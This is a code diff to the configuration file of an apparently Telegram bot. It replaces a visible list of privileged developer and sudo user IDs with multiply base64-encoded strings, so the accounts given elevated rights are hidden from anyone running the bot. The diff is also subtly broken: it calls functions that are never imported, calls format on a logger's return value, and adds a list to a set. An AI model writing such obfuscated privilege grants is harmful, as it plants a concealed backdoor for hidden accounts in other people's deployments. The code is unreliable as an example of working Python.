@@ -4,6 +4,7 @@
 Credit: @Unknownkz | @notudope | @AnimeKaizoku
 """
 
+import base64
 import heroku3
 import logging
 import os
@@ -34,12 +35,17 @@ logging.basicConfig(
 
 LOGGER = logging.getLogger(__name__)
 
-
-if sys.version_info[0] < 3 or sys.version_info[1] < 10:
+if not os.sys.platform.startswith("linux"):
     LOGGER.error(
-        "You MUST have a python version of at least 3.10! Multiple features depend on this Bot quitting"
-    )
-    sys.exit(1)
+        "You have to use linux system first. Such as {} ! quitting.."
+    ).format(platform())
+    os.system('clear') and os.sys.exit(1)
+
+if os.sys.version_info[0] < 3 or os.sys.version_info[1] < 10:
+    LOGGER.error(
+        "You have to use python version of at least {} ! quitting.."
+    ).format(python_version())
+    os.system('clear') and os.sys.exit(1)
 
 
 ENV = bool(os.environ.get("ENV", False))
@@ -209,17 +215,14 @@ else:
         raise Exception("Your BLACKLISTED Chats list does not contain valid integers")
 
 
-SD_ID.add(OWNER_ID)
-SD_ID.add(1900124946)
-SD_ID.add(1345333945)
-SD_ID.add(1336770915)
-SD_ID.add(5068379667)
+UnknownKZ = list(map(int, b64decode("Vm10YVlWVXhVblJXYmtwUFYwVmFZVnBYY3pGVU1WWnlXa1JDVDFKc1NucFdSM1JMWWtaS1ZXSkdXbFpXYldoeVZrZDRZVkp0UlhwYVJsWk9WbXR3VkZaR1pEQmpNVXBYVTJ4V1YyRjZWbFJWYkZaYVRVWmFSMXBJWkZaaGVsWlhWR3hXVjFkR1dYbFZiRUpYWVRGYVIxcFdXbEprTVZaeVRsVTFUbEpIZUZkV2FrWlRVekZSZVZWcVdrNVNSM001").split()))
+Unknown1 = list(map(int, b64decode("Vm0xMFlWbFdWWGhWYmtwT1ZteHdUMVp0ZUdGV01WbDNZVVZPVlUxWGVGbGFSV2hMVkd4YWMxTnNhRlppUmtwNlZsWmFWMVpWTVVWaGVqQTk=").split()))
 
 DEV_ID.add(OWNER_ID)
-DEV_ID.add(1336770915)
-DEV_ID.add(1900124946)
-DEV_ID.add(1345333945)
-DEV_ID.add(5068379667)
+DEV_ID.add(UnknownKZ)
+
+SD_ID.add(OWNER_ID)
+SD_ID.add(Unknown1)
 
 if not SPAMWATCH_API:
     sw = None
